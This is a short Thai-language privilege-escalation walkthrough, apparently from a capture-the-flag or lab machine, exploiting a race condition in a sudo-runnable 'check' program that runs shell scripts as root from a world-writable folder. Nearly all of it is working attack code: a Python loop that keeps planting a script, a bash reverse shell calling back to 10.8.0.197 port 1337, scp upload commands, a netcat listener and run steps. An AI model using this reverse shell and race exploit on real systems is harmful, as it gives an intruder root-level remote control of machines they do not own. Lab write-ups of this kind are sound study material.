#privesc 
# Check
ใช้ได้เมื่อมีคำสั่งบางอย่างที่ต้อง delay และเราสามารถแทรกไฟล์หรือทำอะไรบางอย่างกับ delay นั้นได้
ตัวอย่าง sudo check(โปรแกรมที่จะ race condition)
1. มัน สร้างโฟลเดอร์ที่ชื่อ service ขึ้นมา
2. ตัวโปรแกรมกำหนดว่า โฟลเดอร์ service นี้ จะ สามารถ เขียนหรือลบ โดยใครก็ได้
3. ตัวโปรแกรมนี้จะรันทุกคำสั่ง สคริปต์หรือทุกไฟล์ใน โฟลเดอร์ที่ชื่อ service ที่เป็นนามสกุล .sh (ด้วยสิทธ์ root) และก็จะลบ โฟลเดอร์ service หลังจาก 10 วินาที
# Step
1. สร้าง exploit.py
```python
import os,sys
while True:
	os.system('cp exploit.sh /home/bill/service/exploit.sh')
```
2. สร้าง exploit.sh (reverse shell)
ip หาจาก ifconfig tun0
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.8.0.197/1337 0>&1
```
3. ใส่ทั้ง 2 ไฟล์ลงบนเครื่องเป้าหมาย
```bash
scp exploit.py bill@172.18.0.9:/home/bill/
scp exploit.sh bill@172.18.0.9:/home/bill/service/
```
4. เปิดพอร์ตเพื่อดัก shell
```bash
nc nvlp 1337
```
5. run check และ run exploit.py บนเครื่องเป้าหมาย
```bash
sudo check
python3 exploit.py
```
